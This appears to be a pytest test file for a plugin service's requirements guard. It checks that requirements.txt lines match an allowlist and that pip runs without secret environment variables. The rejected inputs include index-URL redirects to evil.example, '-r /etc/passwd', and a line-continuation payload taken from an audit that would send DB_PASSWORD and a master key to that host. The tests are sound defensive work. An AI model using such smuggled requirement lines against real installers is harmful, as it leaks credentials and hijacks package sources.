"""SC-03: plugin requirements are validated per line against an allowlist grammar
and pip runs isolated, without the core's environment."""
import asyncio

import pytest

import core.services  # noqa: F401  (breaks the core.api import cycle)
from core.components.plugins.logic import plugin_service as plugin_service_module
from core.components.plugins.logic.plugin_service import PluginService
from core.components.plugins.logic.requirements_guard import check_requirements, pip_environment

# Copies of the lines the real plugins ship today (discord-notifier,
# external-services, iac-orchestrator) plus common legitimate spellings.
ACCEPTED_LINES = [
    "PyNaCl>=1.5",
    "requests>=2.31",
    "# No additional plugin-specific runtime dependencies.",
    "deepdiff",
    "PyYAML",
    "deepmerge==1.1.1",
    "jinja2>=3.1.0,<4.0.0",
    "httpx",
    "docker-py",
    "",
    "   ",
    "uvicorn[standard]>=0.30",
    "pkg[a, b] ~= 1.4.2",
    "ruamel.yaml != 0.17.*",
    "zope.interface>=5 , <7",
    "tomli>=2; python_version < '3.11'",
    'pywin32 >= 300 ; sys_platform == "win32" and python_version >= "3.8"',
    "cryptography==42.0.5  # pinned for the HSM driver",
    "pkg===1.0+local.1",
]

REJECTED_LINES = [
    "--index-url https://evil.example/simple",
    "--extra-index-url=http://10.0.0.5:8080/simple",
    "-r /etc/passwd",
    "-e .",
    "-c constraints.txt",
    "--trusted-host evil.example",
    "git+https://github.com/x/y.git",
    "pkg @ https://evil.example/pkg.whl",
    "pkg @ file:///tmp/pkg",
    "https://evil.example/pkg-1.0.tar.gz",
    "./local_dir",
    "../sibling",
    "/abs/path/pkg.whl",
    "pkg.whl --hash=sha256:abc",
    "requests ${DB_PASSWORD}",
    "requests==$VERSION",
    "requests \\",
    "\\--index-url=https:\\",
    "requests; python_version < '3' or extra == 'https://evil.example/x'",
    "requests --global-option=x",
    "requests>=2 <3 extra",
    "requests==",
    "-requests",
    "requests\x00",
]


@pytest.mark.parametrize("line", ACCEPTED_LINES)
def test_plain_requirement_lines_pass(line):
    assert check_requirements(line) == []


def test_real_world_files_pass_as_a_whole():
    assert check_requirements("\n".join(ACCEPTED_LINES) + "\n") == []
    assert check_requirements("deepdiff\r\nPyYAML\r\n") == []  # CRLF checkouts


@pytest.mark.parametrize("line", REJECTED_LINES)
def test_anything_else_is_rejected(line):
    assert check_requirements(line), line


def test_line_continuation_bypass_from_the_audit_is_rejected():
    # pip joins these into "--index-url=https://evil.example/simple/<secrets>/".
    payload = (
        "requests\n"
        "\\--index-url=https:\\\n"
        "\\//evil.example/simple/${DB_PASSWORD}/${LYNDRIX_MASTER_KEY}/\\\n"
        "\n"
    )
    problems = check_requirements(payload)
    assert len(problems) == 2 and all(p.startswith("line ") for p in problems)


def test_continuation_hidden_in_a_comment_is_rejected():
    # pip joins lines BEFORE stripping comments: the option would survive.
    assert check_requirements("requests # harmless \\\n--index-url https://evil.example/\n")


def test_oversized_file_is_rejected():
    assert check_requirements("requests\n" * 500)


def test_pip_environment_carries_no_secrets():
    source = {
        "PATH": "/usr/bin", "HOME": "/root", "HTTPS_PROXY": "http://proxy.invalid:3128",
        "DB_PASSWORD": "dummy-db-password-not-real",
        "LYNDRIX_MASTER_KEY": "dummy-master-key-not-real",
        "GITHUB_TOKEN": "dummy-token-not-real", "GITLAB_TOKEN": "dummy-token-not-real",
        "LYNDRIX_SYSTEM_API_KEY": "dummy-token-not-real",
        "PIP_INDEX_URL": "https://evil.example/simple", "PIP_CONFIG_FILE": "/tmp/pip.conf",
        "PYTHONPATH": "/app",
    }
    env = pip_environment(source)
    assert env["PATH"] == "/usr/bin" and env["HOME"] == "/root"
    assert env["HTTPS_PROXY"] == "http://proxy.invalid:3128"
    assert not any("not-real" in value or "evil" in value for value in env.values())
    assert set(env) <= {"PATH", "HOME", "HTTPS_PROXY", "PIP_NO_INPUT", "PIP_DISABLE_PIP_VERSION_CHECK"}


class _FakeProcess:
    returncode = 0

    async def communicate(self):
        return b"", b""


def _capture_pip(monkeypatch):
    calls = []

    async def fake_exec(*argv, **kwargs):
        calls.append((argv, kwargs))
        return _FakeProcess()

    monkeypatch.setattr(plugin_service_module.asyncio, "create_subprocess_exec", fake_exec)
    return calls


def test_pip_runs_isolated_with_a_clean_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("DB_PASSWORD", "dummy-db-password-not-real")
    monkeypatch.setenv("LYNDRIX_MASTER_KEY", "dummy-master-key-not-real")
    monkeypatch.setenv("PIP_INDEX_URL", "https://evil.example/simple")
    monkeypatch.setattr(plugin_service_module.settings, "LYNDRIX_PLUGIN_PIP_CACHE_DIR", "", raising=False)
    monkeypatch.setattr(plugin_service_module.settings, "LYNDRIX_PLUGIN_PIP_INDEX_URL", "", raising=False)
    calls = _capture_pip(monkeypatch)
    (tmp_path / "requirements.txt").write_text("deepmerge==1.1.1\n")

    asyncio.run(PluginService()._install_requirements(tmp_path))

    assert len(calls) == 1
    argv, kwargs = calls[0]
    assert "--isolated" in argv and "--no-input" in argv
    assert "--index-url" not in argv
    env = kwargs["env"]
    assert "DB_PASSWORD" not in env and "LYNDRIX_MASTER_KEY" not in env and "PIP_INDEX_URL" not in env
    assert "PATH" in env


def test_configured_index_url_is_passed_explicitly(tmp_path, monkeypatch):
    monkeypatch.setattr(plugin_service_module.settings, "LYNDRIX_PLUGIN_PIP_CACHE_DIR", "", raising=False)
    monkeypatch.setattr(
        plugin_service_module.settings, "LYNDRIX_PLUGIN_PIP_INDEX_URL",
        "https://mirror.example.invalid/simple", raising=False,
    )
    calls = _capture_pip(monkeypatch)
    (tmp_path / "requirements.txt").write_text("deepmerge==1.1.1\n")

    asyncio.run(PluginService()._install_requirements(tmp_path))

    argv = calls[0][0]
    assert argv[argv.index("--index-url") + 1] == "https://mirror.example.invalid/simple"
